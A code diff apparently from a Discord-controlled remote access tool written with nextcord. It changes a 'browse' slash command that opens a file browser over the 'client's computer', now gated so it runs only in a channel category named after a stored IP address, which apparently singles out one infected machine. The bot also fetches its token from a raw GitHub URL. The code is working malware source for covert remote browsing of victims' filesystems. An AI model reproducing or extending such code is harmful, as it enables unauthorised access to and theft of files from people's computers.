@@ -775,9 +775,12 @@ async def output_log(interaction : Interaction):
 
 @client.slash_command(guild_ids=testServerId, description="Opens a file browser for client's computer.")
 async def browse(interaction: nextcord.Interaction):
-    initial_path = None if os.name == 'nt' else '/'
-    view = FileView(initial_path, [])
-    await interaction.response.send_message("Browse files:", view=view)
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        print("Browse command received")
+        initial_path = None if os.name == 'nt' else '/'
+        view = FileView(initial_path, [])
+        await interaction.response.send_message("Browse files:", view=view)
 
 print("Getting token")
 r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
